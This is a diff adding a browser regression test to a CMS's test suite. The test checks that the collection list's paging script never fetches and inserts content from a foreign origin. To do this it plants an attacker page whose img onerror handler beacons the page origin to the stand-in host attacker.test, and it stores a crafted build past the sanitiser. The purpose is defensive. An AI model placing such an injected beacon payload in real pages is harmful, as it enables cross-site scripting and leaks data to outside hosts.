@@ -4253,6 +4253,76 @@ await step('3.31.1: a stage with deals keeps its kind; the certificates\' remind
   }
 });
 
+// 3.31.2 (N99): the collection list swaps itself only with its own page. A link inside the list to another origin (the audit's
+// proof of concept: a card element with the class of the page links) or to another path of the site is an ordinary link –
+// never fetched, nothing of its answer is put into the page. The attacker's host is answered by the test itself.
+// The step makes its own paged Collection list on /n99-list and removes it again. The card text carries the class of the
+// list's page links and a link to another origin, as a build stored before "ka-" names were reserved could (written past
+// the sanitiser on purpose).
+const n99Setup = `require "system/bootstrap.php"; $db = Kaleta\\Core\\App::boot()->db();
+  $idk = $db->insert("kolekce", ["nazev" => "N99 list", "seo_link" => "n99-items", "pole" => "[]", "detail" => 0]);
+  foreach ([1, 2, 3, 4, 5] as $i) { $db->insert("kolekce_polozky", ["idk" => $idk, "nazev" => "N99 item " . $i, "seo_link" => "n99-item-" . $i, "data" => "{}", "poradi" => $i, "datum" => date("Y-m-d H:i:s")]); }
+  [$build] = Kaleta\\Builder\\Build::sanitize(["v" => 1, "deti" => [Kaleta\\Builder\\Build::fresh("sekce", [], [["id" => "n99l"] + Kaleta\\Builder\\Build::fresh("kolekce", ["kolekce" => "n99-items", "pocet" => 2, "strankovani" => true], [
+    Kaleta\\Builder\\Build::fresh("nadpis", ["text" => "{{nazev}}"]), ["id" => "n99t"] + Kaleta\\Builder\\Build::fresh("text", ["html" => "<p><a href=\\"http://attacker.test/list\\">More</a></p>"])])])]]);
+  $json = str_replace("\\"id\\":\\"n99t\\"", "\\"id\\":\\"n99t\\",\\"tridy\\":[\\"ka-kolekce-strany\\"]", Kaleta\\Builder\\Build::toJson($build));
+  if (!str_contains($json, "ka-kolekce-strany")) { fwrite(STDERR, "the N99 build has no text element"); exit(1); }
+  $db->insert("stranky", ["seo_link" => "n99-list", "titulek" => "N99 list", "text" => "", "v_menu" => 0, "zobrazit" => 1, "stavba" => $json]);`;
+await step('3.31.2 N99: the collection list is fetched only from its own page – a link to another origin or path is never fetched and inserted; the real page links still swap the list', async () => {
+  const guest = await browser.newContext({ viewport: { width: 1440, height: 900 }, locale: 'en-GB' });
+  const p = await guest.newPage();
+  watch(p);
+  const seen = [];
+  // the planted handler reports the origin it ran in; on the attacker's own page (an ordinary navigation) that is the attacker's
+  const payload = '<!doctype html><title>attacker</title><div class="ka-kolekce" data-kolekce="n99l"><img src="x" onerror="new Image().src = \'http://attacker.test/ran?in=\' + encodeURIComponent(location.origin)"><p id="n99-planted">planted</p></div>';
+  await guest.route('http://attacker.test/**', (route) => {
+    seen.push(`${route.request().resourceType()} ${route.request().method()} ${route.request().url()}`);
+    return route.fulfill({ status: 200, contentType: 'text/html', headers: { 'Access-Control-Allow-Origin': BASE, 'Access-Control-Allow-Headers': 'x-requested-with', 'Access-Control-Allow-Credentials': 'true' }, body: payload });
+  });
+  const own = [];
+  p.on('request', (r) => { if (r.headers()['x-requested-with'] === 'kaleta-list') { own.push(r.url()); } });
+  const open = async () => {
+    await p.goto(BASE + '/n99-list', { waitUntil: 'networkidle' });
+    if ((await p.locator('[data-kolekce="n99l"] .ka-kolekce-strany a').count()) < 3) { throw new Error('the list has no page links'); }
+  };
+  try {
+    execFileSync('php', ['-r', n99Setup], { cwd: process.env.WEB_DIR, encoding: 'utf8' });
+    await open();
+    // the stored class is not rendered: the card text is no "page links" block, only the list's own <ul> is
+    const stored = await p.evaluate(() => [document.querySelectorAll('.ka-kolekce-strany').length, document.querySelectorAll('ul.ka-kolekce-strany').length, document.querySelectorAll('a[href="http://attacker.test/list"]').length]);
+    if (stored[0] !== 1 || stored[1] !== 1 || stored[2] < 1) { throw new Error(`the stored "ka-" class was rendered, or the card link is missing: ${stored}`); }
+    // the real page link: fetched from this page, the list swapped, the address changed without a reload
+    await p.evaluate(() => { window.n99same = true; });
+    await p.click('[data-kolekce="n99l"] ul.ka-kolekce-strany a:not([aria-current])');
+    await p.waitForFunction(() => /[?&]s-n99l=2/.test(location.search) && document.querySelector('[data-kolekce="n99l"]').textContent.includes('N99 item 3'));
+    if (!(await p.evaluate(() => window.n99same === true)) || own.length !== 1 || !own[0].startsWith(BASE + '/n99-list?')) { throw new Error(`the page link did not swap the list in place: ${JSON.stringify(own)}`); }
+    // the attack with the script alone (as if the class had been rendered): a block with the page links' class and a link to the attacker
+    for (const [href, lands] of [['http://attacker.test/list', 'http://attacker.test/list'], [BASE + '/contact?n99=1', BASE + '/contact?n99=1']]) {
+      await open();
+      own.length = 0; seen.length = 0;
+      await p.evaluate((h) => {
+        const block = document.createElement('p');
+        block.className = 'ka-kolekce-strany';
+        block.innerHTML = '<a id="n99-bait" href="' + h + '">More</a>';
+        document.querySelector('[data-kolekce="n99l"]').append(block);
+      }, href);
+      await Promise.all([p.waitForURL(lands), p.click('#n99-bait')]);
+      await p.waitForLoadState('networkidle');
+      if (own.length !== 0 || (href.startsWith('http://attacker.test/') && !seen.some((r) => r.startsWith('document '))) || seen.some((r) => /^(fetch|xhr) /.test(r))) { throw new Error(`${href} was fetched by the list script: ${JSON.stringify([own, seen])}`); }
+      if (seen.some((r) => r.includes('/ran?in=' + encodeURIComponent(BASE)))) { throw new Error('the planted handler ran on the site'); }
+    }
+    // even called with such an address, the swap does not insert the answer: the popstate path with a foreign state changes nothing
+    await open();
+    seen.length = 0;
+    await p.evaluate(() => { history.pushState({ kolekce: 'n99l' }, '', location.pathname + '?s-n99l=3'); window.dispatchEvent(new PopStateEvent('popstate', { state: { kolekce: 'n99l' } })); });
+    await p.waitForFunction(() => document.querySelector('[data-kolekce="n99l"]').textContent.includes('N99 item 5'));
+    if (await p.locator('#n99-planted').count() !== 0 || seen.length !== 0) { throw new Error('the list took content from elsewhere'); }
+  } finally {
+    await guest.close();
+    sql("DELETE FROM ka_kolekce_polozky WHERE seo_link LIKE 'n99-item-%'; DELETE FROM ka_kolekce WHERE seo_link = 'n99-items'; DELETE FROM ka_stranky WHERE seo_link = 'n99-list'");
+    execFileSync('sh', ['-c', 'rm -f "$WEB_DIR"/storage/cache/stranky/*.html'], { env: process.env });
+  }
+});
+
 await browser.close();
 if (errors.length) {
   console.log(`\nSCRIPT ERRORS: ${errors.length}\n  ` + [...new Set(errors)].join('\n  '));
